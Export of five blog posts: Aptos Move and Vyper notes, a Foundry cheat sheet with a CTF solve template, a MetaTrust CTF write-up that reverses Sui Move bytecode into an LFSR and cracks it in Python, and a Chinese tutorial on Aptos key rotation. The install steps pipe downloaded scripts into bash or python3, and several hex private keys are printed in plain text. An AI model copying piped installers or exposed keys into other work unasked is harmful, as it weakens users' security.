[{"content":"Global Storage move_to\u0026lt;T\u0026gt;(\u0026amp;signer,T) 只能 move_to 自己的 account，因為要傳入 \u0026amp;signer 同一種 resource 只能放一個 borrow_global\u0026lt;T\u0026gt;(address): \u0026amp;T 可讀任何 account 的 resource 值，前提是 module 需要實作這個功能 borrow_global_mut\u0026lt;T\u0026gt;(address): \u0026amp;mut T 可讀寫 resource 值 move_from\u0026lt;T\u0026gt;(address): T exists\u0026lt;T\u0026gt;(address): bool Notes 都需要有 key 能力的 resource resource 只能在被定義的 module 內更改，需實作一個修改 resource 的 function Acquires 定義所有這個 function 會用到的 resource 只需定義這個 module 的，就算會 call 到其他 moudule 可以不用管 module 不能存取其他 module 的 resource 只要 function 有用到 Global Storage 的操作都需要寫 Coin coin init 後會有 burn_cap, mint_cap, freeze_cap burn_cap 可以直接 burn 任意地址 coin，使用 burn_from https://github.com/aptos-labs/aptos-core/blob/main/aptos-move/framework/aptos-framework/sources/coin.move#L332 升級 可以看是v幾\n1 aptos move list --url https://aptos-mainnet-rpc.allthatnode.com/v1 --account \u0026lt;account\u0026gt; Reference https://www.zellic.io/blog/top-10-aptos-move-bugs/#1-lack-of-generics-type-checking https://move-book.com/index.html https://move-language.github.io/move/ ","date":"2023-11-29T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/aptos-move-note/","title":"Aptos Move Note"},{"content":"Install 1 2 curl -L https://foundry.paradigm.xyz | bash foundryup Init 1 2 forge init hello cd hello build 1 forge build test 1 2 3 4 5 6 forge test forge test -vv # unit tests forge test -m \u0026#34;testExample()\u0026#34; Openzeppelin lib 1 forge install openzeppelin/openzeppelin-contracts Remapping Add remappings to foundry.toml.\n1 remappings = [\u0026#34;@openzeppelin/=lib/openzeppelin-contracts/\u0026#34;] We can import openzeppelin contracts like this:\n1 import \u0026#34;@openzeppelin/contracts/access/Ownable.sol\u0026#34;; Script 1 forge script script/Contract.s.sol:ContractScript --rpc-url ${RPC_URL} --private-key ${PRIVATE_KEY} --legacy -vvvv --broadcast Makefile 1 2 3 4 5 6 7 8 9 -include .env all: build build:; forge build test :; forge test deploy :; forge script script/Solve.s.sol:Solve --rpc-url ${RPC_URL} --private-key ${PRIVATE_KEY} --legacy -vvvv --broadcast Set the .env file:\n1 2 3 RPC_URL=http://10.132.61.18:10033/3695cc9d-4573-4888-91f1-d9ffe61187d0 PRIVATE_KEY=0xf6f246042debbc0c5ddd200e72a3d12e03038d651a5d0c5e744ac30a94e5c3d7 CHAL_ADDR= Remember to load the variables in the .env file.\n1 source .env foundry.toml settings 1 rpc_endpoints = { mainnet = \u0026#34;https://rpc.ankr.com/eth\u0026#34;, optimism = \u0026#34;https://rpc.ankr.com/optimism\u0026#34; , fantom = \u0026#34;https://rpc.ankr.com/fantom\u0026#34;, arbitrum = \u0026#34;https://rpc.ankr.com/arbitrum\u0026#34; , bsc = \u0026#34;http://10.132.83.97:8000/bsc\u0026#34; } Cheat code 1 2 3 4 5 6 7 8 9 10 11 12 13 // fork bsc at block 21157028 vm.createSelectFork(\u0026#34;bsc\u0026#34;, 21157028); // set address(this) 0 ether vm.deal(address(this), 0); vm.startPrank(attacker); vm.stopPrank(); // load address from env chal = Challenge(vm.envAddress(\u0026#34;CHAL_ADDR\u0026#34;)); // load private key from env privKey = uint256(vm.envBytes32(\u0026#34;PRIV_KEY\u0026#34;)); Example script for ctf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; // import { Challenge } from \u0026#34;../src/Challenge.sol\u0026#34;; import { CommonBase } from \u0026#34;forge-std/Base.sol\u0026#34;; import \u0026#34;forge-std/console.sol\u0026#34;; contract Pwn { constructor() payable { // do something... console.log(\u0026#34;print something...\u0026#34;); } } contract Solve is CommonBase { Challenge chal; uint256 privKey; constructor() { chal = Challenge(vm.envAddress(\u0026#34;CHAL_ADDR\u0026#34;)); privKey = uint256(vm.envBytes32(\u0026#34;PRIV_KEY\u0026#34;)); } function run() public { vm.startBroadcast(privKey); Pwn p = new Pwn(); vm.stopBroadcast(); } } Reference Foundry Book ","date":"2023-09-28T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/foundry-notes/","title":"Foundry Notes"},{"content":"Install Vyper 1 pip3 install vyper Tools Vyper intepreter - titanoboa 1 2 3 4 5 # simple.vy @external def foo() -\u0026gt; uint256: x: uint256 = 1 return x + 7 1 2 3 4 5 6 7 \u0026gt;\u0026gt;\u0026gt; import boa \u0026gt;\u0026gt;\u0026gt; simple = boa.load(\u0026#34;examples/simple.vy\u0026#34;) \u0026gt;\u0026gt;\u0026gt; simple.foo() 8 \u0026gt;\u0026gt;\u0026gt; simple.foo()._vyper_type uint256 Compiler bugs https://github.com/vyperlang/vyper/security?page=1\n","date":"2023-09-26T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/vyper-notes/","title":"Vyper notes"},{"content":" move the bytes to see the truth!\ncode: https://github.com/MetaTrustLabs/ctf/tree/master/bytesMove\nyou need to crack this file and find the flag.\ntips: This is a sui bytecode\nTo disassemble the moveBytes.mv file in the MetaTrust CTF, we used the sui client command-line interface. The sui move disassemble command allowed us to view the assembly code for the Move bytecode.\n1 sui move disassemble moveBytes.mv If you\u0026rsquo;re interested in viewing the assembly code for the moveBytes.mv file, you can check out the code at the following link: https://gist.github.com/ashirleyshe/04a5ed08727a5b06fcda2fc545ed56b8\nThe file contains several functions, including compute, byte_to_u64, slice, and solve. The byte_to_u64 and slice functions are not particularly important.\nCheck the value of the constants:\n1 2 3 4 5 6 7 8 9 Constants [ 0 =\u0026gt; u64: 0000000000000000 1 =\u0026gt; u64: 0100000000000000 2 =\u0026gt; vector\u0026lt;u64\u0026gt;: 00 3 =\u0026gt; vector\u0026lt;u8\u0026gt;: 046374667b // ctf{ 4 =\u0026gt; vector\u0026lt;u8\u0026gt;: 017d // } 5 =\u0026gt; vector\u0026lt;u64\u0026gt;: 20c0000000000000000c000000000000004500000000000000c200000000000000b800000000000000d600000000000000780000000000000010000000000000003a000000000000000b00000000000000f9000000000000004c00000000000000ae00000000000000ba00000000000000a20000000000000083000000000000004d00000000000000d100000000000000f200000000000000a7000000000000000e00000000000000df000000000000002e0000000000000047000000000000000100000000000000a00000000000000080000000000000001900000000000000f500000000000000260000000000000086000000000000004a00000000000000 // [192, 12, 69, 194, 184, 214, 120, 16, 58, 11, 249, 76, 174, 186, 162, 131, 77, 209, 242, 167, 14, 223, 46, 71, 1, 160, 128, 25, 245, 38, 134, 74] ] The solve function is the entry point for the program and accepts a vector as its argument, which represents the flag. The function checks the format of the input, computes a value using the compute function, and then asserts that the input is equal to the ciphertext value.\n1 2 3 4 5 6 entry public solve(Arg0: vector\u0026lt;u8\u0026gt;) { ... check the format of the input compute assert the input is equal to the ciphertext (constants 5) } A loop, check i \u0026lt; 32.\n1 2 3 4 5 6 7 8 9 10 11 12 13 115: LdU64(0) 116: StLoc[4](loc3: u64) B14: 117: CopyLoc[4](loc3: u64) 118: LdU64(32) 119: Lt 120: BrFalse(163) ... 158: MoveLoc[4](loc3: u64) 159: LdU64(1) 160: Add 161: StLoc[4](loc3: u64) 162: Branch(117) An inner loop, check j \u0026lt; 8.\n1 2 3 4 5 6 7 8 9 10 11 12 13 124: LdU64(0) 125: StLoc[5](loc4: u64) B17: 126: CopyLoc[5](loc4: u64) 127: LdU64(8) 128: Lt 129: BrFalse(155) ... 150: MoveLoc[5](loc4: u64) 151: LdU64(1) 152: Add 153: StLoc[5](loc4: u64) 154: Branch(126) The compute function takes the i/4th element of the vector as its first argument and the 2290631716 as its second argument.\n1 2 3 4 5 6 7 8 9 10 11 B19: 131: MutBorrowLoc[19](loc18: vector\u0026lt;u64\u0026gt;) 132: CopyLoc[4](loc3: u64) 133: LdU64(4) 134: Div 135: VecMutBorrow(2) 136: StLoc[10](loc9: \u0026amp;mut u64) 137: CopyLoc[10](loc9: \u0026amp;mut u64) 138: ReadRef 139: LdU64(2290631716) 140: Call compute(u64, u64): u64 * u64 // compute(vec[i/4], 2290631716) 1 2 3 4 5 6 7 8 9 141: StLoc[8](loc7: u64) 142: MoveLoc[10](loc9: \u0026amp;mut u64) 143: WriteRef 144: MoveLoc[20](loc19: u64) 145: LdU8(1) 146: Shl // var \u0026lt;\u0026lt; 1 147: MoveLoc[8](loc7: u64) 148: Xor 149: StLoc[20](loc19: u64) I construct the script like this:\n1 2 3 4 5 6 7 output = [] for i in range(32): tmp = 0 for j in range(8): (vec[i/4], out) = compute(vec[i/4], 2290631716) tmp = (tmp \u0026lt;\u0026lt; 1) ^ out output.append(tmp) Finally, you\u0026rsquo;ll find it is a LFSR.\n1 2 3 4 5 6 7 8 9 def compute(arg0, arg1): loc0 = (arg0 \u0026lt;\u0026lt; 1) \u0026amp; 4294967295 loc1 = arg0 \u0026amp; arg1 \u0026amp; 4294967295 loc2 = 0 while loc1 != 0: loc2 ^= (loc1 \u0026amp; 1) loc1 \u0026gt;\u0026gt;= 1 loc0 ^= loc2 return (loc0, lco2) To crack the flag, I wrote a Python script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ct = [192, 12, 69, 194, 184, 214, 120, 16, 58, 11, 249, 76, 174, 186, 162, 131, 77, 209, 242, 167, 14, 223, 46, 71, 1, 160, 128, 25, 245, 38, 134, 74] def rev_compute(vec, mask): curr = vec \u0026gt;\u0026gt; 1 b = vec \u0026amp; 1 vec \u0026gt;\u0026gt;= 1 while mask: if mask \u0026amp; 1: b ^= vec \u0026amp; 1 vec \u0026gt;\u0026gt;= 1 mask \u0026gt;\u0026gt;= 1 return curr | (b \u0026lt;\u0026lt; 31) mask = 2290631716 s0 = int.from_bytes(ct[:4], \u0026#34;big\u0026#34;) s1 = int.from_bytes(ct[4:8], \u0026#34;big\u0026#34;) s2 = int.from_bytes(ct[8:12], \u0026#34;big\u0026#34;) s3 = int.from_bytes(ct[12:16], \u0026#34;big\u0026#34;) s4 = int.from_bytes(ct[16:20], \u0026#34;big\u0026#34;) s5 = int.from_bytes(ct[20:24], \u0026#34;big\u0026#34;) s6 = int.from_bytes(ct[24:28], \u0026#34;big\u0026#34;) s7 = int.from_bytes(ct[28:32], \u0026#34;big\u0026#34;) for _ in range(32): s0 = rev_compute(s0, mask) s1 = rev_compute(s1, mask) s2 = rev_compute(s2, mask) s3 = rev_compute(s3, mask) s4 = rev_compute(s4, mask) s5 = rev_compute(s5, mask) s6 = rev_compute(s6, mask) s7 = rev_compute(s7, mask) print(s7.to_bytes(4, \u0026#34;big\u0026#34;) + s6.to_bytes(4, \u0026#34;big\u0026#34;) + s2.to_bytes(4, \u0026#34;big\u0026#34;) + s5.to_bytes(4, \u0026#34;big\u0026#34;) + s4.to_bytes(4, \u0026#34;big\u0026#34;) + s3.to_bytes(4, \u0026#34;big\u0026#34;) + s1.to_bytes(4, \u0026#34;big\u0026#34;) + s0.to_bytes(4, \u0026#34;big\u0026#34;)) ","date":"2023-09-18T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/metatrust-ctf-writeup-bytesmove/","title":"Metatrust CTF Writeup - BytesMove"},{"content":"Overview 在本文中，我們將深入探討 Aptos 密鑰輪換的概念及其重要性。在開始之前，讓我們先了解什麼是 Aptos 帳戶、公鑰和私鑰的作用。當私鑰洩漏時，你的帳戶就可能遭到攻擊，但若想保留原有帳戶並確保資產安全，就需要使用密鑰輪換技術。Aptos 帳戶支持密鑰輪換，讓你更改私鑰而不必創建新帳戶，繼而保留原有帳戶的資產和身份。\n接下來，我們將介紹如何使用 Aptos cli 及 Python SDK 完成密鑰輪換，讓你能夠隨時保持帳戶資產及身份的安全。\n什麼是帳戶（account）？ 每個 Aptos 帳戶代表著區塊鏈上一個可以發送交易的實體，並由特定的 32 字節帳戶地址識別。這個帳戶是 Move 模組和 Move 資源的容器，可以包含區塊鏈資產（例如 coin 和 NFT）。這些資產在區塊鏈帳戶中表示為資源，同時帳戶也可以執行各種操作，例如將資源發送給其他人。就像在 Web2 的世界中，你的電子郵件地址代表著你的電子郵件帳戶，而在 Aptos 區塊鏈中，帳戶地址代表著帳戶本身，你可以透過這個地址進行收發資產等操作。\n公鑰（public key）、私鑰（private key） 私鑰在 Aptos 區塊鏈與其他區塊鏈一樣，可以用來簽署交易以使其被認可和驗證，就像在現實生活中需要簽名或輸入密碼才能夠轉帳。簽署過後的交易才能夠對你的帳戶資產進行更改，但是只有擁有私鑰的人才能夠簽署這筆交易，因此私鑰是非常重要且敏感的一組數據。\n在其他區塊鏈上，你的公開身份即為私鑰對應的公鑰，地址可以從公鑰被推算出來，公鑰也被用來驗證簽章。然而，Aptos 支援密鑰輪換，導致公鑰可能會發生變化，因此使用地址來代表帳戶。傳統上，每個帳戶都有一個特定的地址作為其識別符號，而且這個地址是不會改變的。在 Aptos 中，即使您更改了身份驗證密鑰（其中包含公鑰），帳戶地址仍然是唯一的，並且不會發生變化。\n身份驗證密鑰（authentication key） Aptos 區塊鏈支援單簽和多簽帳戶。多簽帳戶允許多個用戶共同執行數位簽章來管理帳戶資產。例如，想像一個擁有兩把鎖和兩把鑰匙的保險箱，一把鑰匙由 Alice 持有，另一把則由 Bob 掌管。打開此保險箱的唯一辦法就是兩個人同時提供鑰匙開鎖，只有其中一把鑰匙時則無法打開。多簽帳戶與此類似，它是代表多方的單一帳戶，所有發生的交易都需要所有參與方的簽名，也可以被設定一個閾值，舉個例子，2-of-3 代表三位中只要有兩個簽署即可完成交易。\n多簽帳戶使用多個（私鑰，公鑰）密鑰對，沒有單個公鑰會代表這個帳戶。因此，我們需要一個代表此帳戶的密鑰，以便封裝多簽帳戶中所有用戶的公鑰，這個代表此帳戶的密鑰也就是所謂的身份驗證密鑰。\n身份驗證密鑰是表示多簽帳戶中所有用戶的一種方式。簡而言之，身份驗證密鑰是通過連接所有參與用戶的公鑰的串聯散列創建的。\n1 auth_key = sha3-256(pubkey_1 | . . . | pubkey_n | K | 0x01) 其中K是驗證交易所需的簽名閾值，0x01為 1-byte 多簽方案標識符。\n對於單簽帳戶，也存在身份驗證密鑰，單簽帳戶的身份驗證密鑰只封裝了一個公鑰來代表帳戶，這樣做是為了在所有類型的帳戶上保持一致性。\n1 auth_key = sha3-256(pubkey_A | 0x00) 其中 0x00 為 1-byte 單簽方案標識符。\n我們可以說，身份驗證密鑰是私鑰的廣義公共表示。\n帳戶地址 在帳戶創建過程中，產生一組公鑰及私鑰後，會計算出一個 32 字節的身份驗證密鑰，這個身份驗證密鑰將作為帳戶地址。\n單簽帳戶：\n1 auth_key = sha3-256(pubkey_A | 0x00) 其中 0x00 為 1-byte 單簽方案標識符。\n多簽帳戶：\n1 auth_key = sha3-256(pubkey_1 | . . . | pubkey_n | K | 0x01) 其中K是驗證交易所需的簽名閾值，0x01為 1-byte 多簽方案標識符。\n但是，密鑰輪換後，身份驗證密鑰會發生變化，當生成新的公鑰-私鑰對時，公鑰將輪換密鑰。但帳戶地址不會改變。因此，僅在最初，32 字節身份驗證密鑰才會與 32 字節帳戶地址相同。帳戶與金鑰解耦的方法使 Aptos 能夠無縫新增新的數位簽名演算法以支援公鑰和私鑰型別。\n帳戶創建後，儘管私鑰、公鑰和認證密鑰可能發生變化，但帳戶地址將保持不變。\n為什麼我們需要密鑰輪換？ 當私鑰洩漏時，你的帳戶就可能遭到攻擊。在 web2 中，多數人會定期修改密碼，減少被盜的風險，還有在 Instagram 或 Facebook 帳戶被盜後，你可以透過其他方式驗證身份，修改密碼並拿回自己的帳號。但是，在大多數區塊鏈中，情況並不那麼簡單。私鑰與公鑰成對出現，而鏈上身份與私鑰綁定，唯一的解決方法是創建一個新帳戶，使用新的公鑰和私鑰對並將所有資產轉移到該帳戶中。\n然而，這種方法會造成很多問題，例如失去原有的帳戶資產、OG 身份的象徵、以及參與過的活動的紀念等。因此，密鑰輪換技術應運而生。Aptos 帳戶支援密鑰輪換，讓你更改私鑰而不必創建新帳戶，從而保留原有帳戶的資產和身份。這意味著你可以保持原有地址，其他人仍然可以使用你原本的地址向你發送資產。唯一會改變的是身份驗證密鑰，因為它是由公鑰計算出來的。\n密鑰輪換技術實現了鏈上身份與安全性分離，當私鑰洩漏時，你可以替換掉私鑰，從而保護資產免於受到損失或竊取。此外，密鑰輪換也使得我們可以定期更改密鑰，減少私鑰被盜取的風險，同時也為使用多簽帳戶提供了更多彈性。\nAuthentication key rotation 密鑰輪換，在 Aptos 中準確來說稱為身份驗證密鑰輪換（Authentication key rotation）。\naccount.move 模塊包含了 Aptos 帳戶相關的所有函數。 用戶可以透過 account::rotate_authentication_key 函數來達成密鑰輪換。\n1 2 3 4 5 6 7 8 9 10 11 12 public entry fun rotate_authentication_key( account: \u0026amp;signer, from_scheme: u8, from_public_key_bytes: vector\u0026lt;u8\u0026gt;, to_scheme: u8, to_public_key_bytes: vector\u0026lt;u8\u0026gt;, cap_rotate_key: vector\u0026lt;u8\u0026gt;, cap_update_table: vector\u0026lt;u8\u0026gt;, ) acquires Account, OriginatingAddress { ... } 為了授權輪換，我們需要兩個簽名：\ncap_rotate_key 是指帳戶目前擁有者對 RotationProofChallenge 的簽名，證明用戶打算並具有能力輪換此帳戶的身份驗證金鑰 cap_update_table 是指所需輪換至的新金鑰（帳戶擁有者想要輪換的金鑰）對RotationProofChallenge 的簽名，證明用戶擁有新的私鑰，並有權更新 OriginatingAddress 映射與新地址映射 \u0026lt;new_address, originating_address\u0026gt;。 為了驗證這兩個簽名，我們需要它們對應的公鑰和公鑰方案：我們使用 from_scheme 和from_public_key_bytes驗證cap_rotate_key，使用to_scheme和to_public_key_bytes驗證cap_update_table。\n單簽為ED25519_SCHEME，多簽則為MULTI_ED25519_SCHEME。\n使用 Aptos cli 達成單簽帳戶密鑰輪換 初始狀態，可以看到 account address 與 authentication key 相同。 產生密鑰： 1 2 3 4 5 6 7 aptos key generate --key-type ed25519 --output-file output.key { \u0026#34;Result\u0026#34;: { \u0026#34;PrivateKey Path\u0026#34;: \u0026#34;output.key\u0026#34;, \u0026#34;PublicKey Path\u0026#34;: \u0026#34;output.key.pub\u0026#34; } } 利用 aptos cli 做 key rotation，參數可以選擇直接填入私鑰或 key file: 1 aptos account rotate-key --new-private-key-file output.key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 aptos account rotate-key --new-private-key 0xae249782eedbfafcc7da157542d1f97d97385cbda36338c806475a3ce127fd90 Do you want to submit a transaction for a range of [52100 - 78100] Octas at a gas unit price of 100 Octas? [yes/no] \u0026gt; yes { \u0026#34;transaction_hash\u0026#34;: \u0026#34;0x75c412d82e038f87cec14c6c8b08c7fb08290118437e18433700c0e5d0262854\u0026#34;, \u0026#34;gas_used\u0026#34;: 521, \u0026#34;gas_unit_price\u0026#34;: 100, \u0026#34;sender\u0026#34;: \u0026#34;148f1f6f88d690a04451fa8a548f21129b537cf511cedaa66a6ad93abc83a607\u0026#34;, \u0026#34;sequence_number\u0026#34;: 0, \u0026#34;success\u0026#34;: true, \u0026#34;timestamp_us\u0026#34;: 1688636116823320, \u0026#34;version\u0026#34;: 571106848, \u0026#34;vm_status\u0026#34;: \u0026#34;Executed successfully\u0026#34; } Do you want to create a profile for the new key? [yes/no] \u0026gt; yes Enter the name for the profile Update Profile Update is saved. { \u0026#34;Result\u0026#34;: { \u0026#34;message\u0026#34;: \u0026#34;Profile Update is saved.\u0026#34;, \u0026#34;transaction\u0026#34;: { \u0026#34;transaction_hash\u0026#34;: \u0026#34;0x75c412d82e038f87cec14c6c8b08c7fb08290118437e18433700c0e5d0262854\u0026#34;, \u0026#34;gas_used\u0026#34;: 521, \u0026#34;gas_unit_price\u0026#34;: 100, \u0026#34;sender\u0026#34;: \u0026#34;148f1f6f88d690a04451fa8a548f21129b537cf511cedaa66a6ad93abc83a607\u0026#34;, \u0026#34;sequence_number\u0026#34;: 0, \u0026#34;success\u0026#34;: true, \u0026#34;timestamp_us\u0026#34;: 1688636116823320, \u0026#34;version\u0026#34;: 571106848, \u0026#34;vm_status\u0026#34;: \u0026#34;Executed successfully\u0026#34; } } } 回到 Aptos explorer 查看，authentication key 已改變，account address 維持相同。 aptos cli 也可以透過 public key 來反查出帳戶地址：\n1 2 3 4 aptos account lookup-address --public-key-file output.key.pub { \u0026#34;Result\u0026#34;: \u0026#34;148f1f6f88d690a04451fa8a548f21129b537cf511cedaa66a6ad93abc83a607\u0026#34; } 使用 Python SDK 將單簽帳戶輪換為多簽帳戶 以 aptos-core 中 python sdk 的 multisig 範例作為參考，可以根據自己的使用情境進行修改。\n總結一下流程：\n建立一個單簽帳戶 建立一個多簽帳戶，這邊是建立一個 2-of-3 多簽帳戶 簽署 rotation proof challenge 執行輪換 authentication key 環境安裝 安裝 Poetry 推薦使用 Poetry 進行 Python 套件管理。\n安裝 Poetry 1 curl -sSL https://install.python-poetry.org | python3 - 將 Poetry 加入 PATH 依照自己的系統環境，加到 .zshrc 或 .bashrc 1 export PATH=\u0026#34;$HOME/.local/bin:$PATH\u0026#34; 確認 Poetry 安裝完成 1 poetry --version 安裝 Aptos Python SDK 1 pip3 install aptos-sdk 更多詳細資訊，可參考官網文檔。\n執行 Aptos SDK Example 1 git clone https://github.com/aptos-labs/aptos-core.git 1 cd aptos-core/ecosystem/python/sdk 重現專案的 Poetry 虛擬環境 1 poetry env use python3 安裝套件 1 poetry install 執行 1 poetry run python -m examples.multisig 設定 引入要用到的庫\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from aptos_sdk.account import Account, RotationProofChallenge from aptos_sdk.account_address import AccountAddress from aptos_sdk.authenticator import Authenticator, MultiEd25519Authenticator from aptos_sdk.bcs import Serializer from aptos_sdk.client import FaucetClient, RestClient from aptos_sdk.ed25519 import MultiPublicKey, MultiSignature from aptos_sdk.transactions import ( EntryFunction, RawTransaction, Script, ScriptArgument, SignedTransaction, TransactionArgument, TransactionPayload, ) from aptos_sdk.type_tag import StructTag, TypeTag 設定連接節點、水龍頭資訊，這邊使用 devnet 環境：\n1 2 3 4 5 NODE_URL = os.getenv(\u0026#34;APTOS_NODE_URL\u0026#34;, \u0026#34;https://fullnode.devnet.aptoslabs.com/v1\u0026#34;) FAUCET_URL = os.getenv( \u0026#34;APTOS_FAUCET_URL\u0026#34;, \u0026#34;https://faucet.devnet.aptoslabs.com\u0026#34;, ) 初始化客戶端\n1 2 rest_client = RestClient(NODE_URL) faucet_client = FaucetClient(FAUCET_URL, rest_client) 建立單簽帳戶 1 2 3 deedee = Account.generate() faucet_client.fund_account(deedee.address(), 50_000_000) deedee_balance = rest_client.account_balance(deedee.address()) 1 2 3 4 Deedee\u0026#39;s address: 0x7ee730f9bb87e78b0f51b4399113af2ed6bc50d0a8e0bc27f914c287af6a9d49 Deedee\u0026#39;s auth key: 0x7ee730f9bb87e78b0f51b4399113af2ed6bc50d0a8e0bc27f914c287af6a9d49 Deedee\u0026#39;s public key: 0x641cb41098c6cea2c2643508ee28e116459c666e353d6dc708290c5dd8f27169 Deedee\u0026#39;s balance: 50000000 建立多簽帳戶 這邊我們選擇建立 2-of-3 多簽帳戶，所以先建立三個單簽帳戶，這樣會有三對公鑰私鑰對。\n1 2 3 4 5 6 7 8 9 # generate account alice = Account.generate() bob = Account.generate() chad = Account.generate() # fund account faucet_client.fund_account(alice.address(), 10_000_000) faucet_client.fund_account(bob.address(), 20_000_000) faucet_client.fund_account(chad.address(), 30_000_000) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 === Account addresses === Alice: 0xe2f0ac3bf3066f83c3f13df40eb1f1e980b15bbf6198dfee0d4bfd741baf92a8 Bob: 0x55234e90dec96a74938a4da2f7815b97494fc3c4b4d8782fa9c0e83399613310 Chad: 0x9b2ff4d016b1dead4c79487275bcb332ce56d0c707bc07cf0f15e223e64122a0 === Authentication keys === Alice: 0xe2f0ac3bf3066f83c3f13df40eb1f1e980b15bbf6198dfee0d4bfd741baf92a8 Bob: 0x55234e90dec96a74938a4da2f7815b97494fc3c4b4d8782fa9c0e83399613310 Chad: 0x9b2ff4d016b1dead4c79487275bcb332ce56d0c707bc07cf0f15e223e64122a0 === Public keys === Alice: 0x53a03cc129319935ddabc8ac2afb0c5e320cd5bda347413fb6fe33bcdd0b7fb3 Bob: 0x51a95405c021b0449d11d71797ecb72e931c045a55f69ae96aa6c87d55ba8098 Chad: 0x74ac180a4c5b4f6e14f13b8a5e6dd19d102c0e3543268816dcb6484f0da5444d 接下來使用上一步產生的公鑰去生成 2-of-3 多簽帳戶公鑰和地址。\n1 2 3 4 5 6 7 8 9 # generate public key from Alice, Bob and Chad\u0026#39;s public key threshold = 2 multisig_public_key = MultiPublicKey( [alice.public_key(), bob.public_key(), chad.public_key()], threshold ) # get address multisig_address = AccountAddress.from_multi_ed25519(multisig_public_key) # fund account faucet_client.fund_account(multisig_address, 40_000_000) 1 2 3 === 2-of-3 Multisig account === Account public key: 2-of-3 Multi-Ed25519 public key Account address: 0x77e7728ef2189e48b3b898087c460a63f14955bcc6e4915b95aab8f864be8d05 簽署 rotation proof challenge 在調用 rotate_authentication_key 之前，需要準備傳入的參數，分別是 cap_rotate_key 及 cap_update_table。 cap_rotate_key 表 Deedee 批准此身份驗證密鑰輪換。 cap_update_table 驗證多簽帳戶是否批准身份驗證密鑰輪換。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 rotation_proof_challenge = RotationProofChallenge( sequence_number=0, originator=deedee.address(), current_auth_key=deedee.address(), new_public_key=multisig_public_key.to_bytes(), ) serializer = Serializer() rotation_proof_challenge.serialize(serializer) rotation_proof_challenge_bcs = serializer.output() cap_rotate_key = deedee.sign(rotation_proof_challenge_bcs).data() cap_update_table = MultiSignature( multisig_public_key, [ (bob.public_key(), bob.sign(rotation_proof_challenge_bcs)), (chad.public_key(), chad.sign(rotation_proof_challenge_bcs)), ], ).to_bytes() 1 2 3 === Signing rotation proof challenge === cap_rotate_key: 0x497d25f09c29df422e620dd8eaf44ee9b7bbc2844b5143ade652d9a0d084cd1b59e66e6d0c8ebd3a4e6d5b70ddc0f635bbe321ea6ac2902d2ab07e3248e5ac08 cap_update_table: 0xe40f69589e89beca67362c2cadb145df92d77351bfe77aa9318af88f1453576b2fc8e8723fca961e696014a0077946a762c18d7a64547b3ec1f0539f88889303d89de34be00ada58151a124cc3610226ca1c0ca9814be9040bba3c6d02f169a53b922ce6cb026165746c8e90837affac8692206dc9eb0f82f0117742d331670a60000000 執行輪換 authentication key 現在可以提交身份驗證密鑰輪換的交易。執行後，輪換後的身份驗證密鑰與多簽帳戶的地址相匹配。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 from_scheme = Authenticator.ED25519 from_public_key_bytes = deedee.public_key().key.encode() to_scheme = Authenticator.MULTI_ED25519 to_public_key_bytes = multisig_public_key.to_bytes() entry_function = EntryFunction.natural( module=\u0026#34;0x1::account\u0026#34;, function=\u0026#34;rotate_authentication_key\u0026#34;, ty_args=[], args=[ TransactionArgument(from_scheme, Serializer.u8), TransactionArgument(from_public_key_bytes, Serializer.to_bytes), TransactionArgument(to_scheme, Serializer.u8), TransactionArgument(to_public_key_bytes, Serializer.to_bytes), TransactionArgument(cap_rotate_key, Serializer.to_bytes), TransactionArgument(cap_update_table, Serializer.to_bytes), ], ) signed_transaction = rest_client.create_bcs_signed_transaction( deedee, TransactionPayload(entry_function) ) # auth key before key rotation auth_key = rest_client.account(deedee.address())[\u0026#34;authentication_key\u0026#34;] print(f\u0026#34;Auth key pre-rotation: {auth_key}\u0026#34;) # send key rotation tx tx_hash = rest_client.submit_bcs_transaction(signed_transaction) rest_client.wait_for_transaction(tx_hash) print(f\u0026#34;Transaction hash: {tx_hash}\u0026#34;) # auth key after key rotation auth_key = rest_client.account(deedee.address())[\u0026#34;authentication_key\u0026#34;] print(f\u0026#34;New auth key: {auth_key}\u0026#34;) print(f\u0026#34;1st multisig address: {multisig_address}\u0026#34;) 1 2 3 4 5 === Submitting authentication key rotation transaction === Auth key pre-rotation: 0x7ee730f9bb87e78b0f51b4399113af2ed6bc50d0a8e0bc27f914c287af6a9d49 Transaction hash: 0x16046f72559268dc4025d28bbc2d8c91ab7a780e237cbf430965477910014df0 New auth key: 0x77e7728ef2189e48b3b898087c460a63f14955bcc6e4915b95aab8f864be8d05 1st multisig address: 0x77e7728ef2189e48b3b898087c460a63f14955bcc6e4915b95aab8f864be8d05 總結 Aptos 帳戶讓鏈上地址身份與私鑰解耦，提供了單簽及多簽帳戶，最重要的是具有密鑰輪換的功能。 地址在創建帳號後維持不變，即使在密鑰輪換後仍然維持相同。 密鑰輪換改變的是公鑰私鑰對以及身份驗證密鑰。\n？ 如果想把兩個帳號換成同個 auth key 可以嗎？\n不可以。\n1 2 3 { \u0026#34;Error\u0026#34;: \u0026#34;Simulation failed with status: Move abort in 0x1::table: 0x6407\u0026#34; } 有個例外，當 auth key == address 的時候可以。\n1 2 3 4 5 6 7 8 9 address: 0xf2e692d2c041973da02f1dc9bd2d8aae30af6f27e706104d8f62cb07a73fcd54 auth key: 0x1be04e2fc6271fcfe03ecaf8e0dba4c0aed93439a6e3efcf40239a547b6a4268 === address: 0x1be04e2fc6271fcfe03ecaf8e0dba4c0aed93439a6e3efcf40239a547b6a4268 auth key: 0x1be04e2fc6271fcfe03ecaf8e0dba4c0aed93439a6e3efcf40239a547b6a4268 Reference https://aptos.dev/concepts/accounts/ https://medium.com/@martian-wallet/accounts-in-aptos-1ecc3f0b1213 